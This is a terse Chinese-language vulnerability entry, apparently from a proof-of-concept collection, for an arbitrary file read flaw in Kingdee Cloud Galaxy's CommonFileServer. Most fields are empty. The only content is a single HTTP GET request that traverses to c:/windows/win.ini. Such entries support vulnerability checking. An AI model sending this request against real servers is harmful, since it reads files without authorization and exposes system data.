﻿# 金蝶云星空 CommonFileserver 任意文件读取漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：金蝶云星空 CommonFileserver 任意文件读取漏洞.poc
